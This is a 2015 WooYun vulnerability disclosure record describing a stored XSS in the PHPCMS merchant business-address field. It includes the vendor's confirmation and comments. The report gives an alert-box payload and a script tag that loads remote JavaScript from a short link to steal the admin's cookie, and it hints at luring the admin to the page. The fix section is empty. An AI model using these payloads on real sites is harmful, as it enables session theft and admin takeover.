{"id": 40321, "wybug_id": "wooyun-2015-091884", "wybug_title": "PHPCMS储存XSS，指哪儿打哪儿#2（本地演示）", "wybug_corp": "phpcms", "wybug_author": "路人甲", "wybug_date": "2015-01-19 11:46", "wybug_open_date": "2015-04-20 14:22", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "黑盒测试技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-22：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-20：\t细节向公众公开  简要描述： 缺个移动硬盘 详细说明：  最近在学PHP，学了几天的PHP以后又来看了一下PHPCMS，代码审计一下吧。。还是一点也看不懂（额废话才学几天PHP就想代码审计了？打死。。），唉苦逼的孩纸不会审计真蛋疼，那就黑盒再来看一遍吧，结果真的就又被我找到了一个，哈哈，存在XSS的地方在会员中心--商务中心--商家资料--基本信息--经营地址那里，本来是想demo演示来着，但是由于实在商务中心需要管理员审核，官方测试的时候管理员还没有审核就本地搭建环境演示了\n\n先下载了PHPCMS的最新版本，然后我们在会员中心--商务中心--商家资料--基本信息--经营地址那里插入\"/><svg onload=alert(/1/)>\n\n接下来来到后台查看发现是不能成功弹窗的，因为这个是在个人企业的首页\n\n没有弹窗肿么办呢？不急~一般管理员在审核通过之后都会去看一下这个企业吧，这个时候我们的机会就来了~后台点击我们的企业之后，可以看到来到企业首页，成功弹窗~\n\n接下来看看能不能打cookie，我们继续构造\"><script src=http://t.cn/RzLE1X0></script>\n\n可以看到cookie已经成功打到~因为这个企业是人人都可以看到的~而且一般管理员审核完之后也会去哦，好吧就算管理员审核之后不去看我们的企业（不大可能哈），那我们利用一些手法去让管理员看我们的企业还是很简单的吧~所以你们懂得~\n\n   漏洞证明：  \n\n   修复方案：  缺个移动硬盘   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2015-01-19 14:07 厂商回复： 感谢提交 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-24 22:36 |    \t\tSofia \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:6        | 不会渗透的SEOer不是好站长)\t\t \n  前排    \n     2015-03-05 15:06 |    \t\tX5st \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:6        | 合伙搞世界)\t\t \n  不错 求关注    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}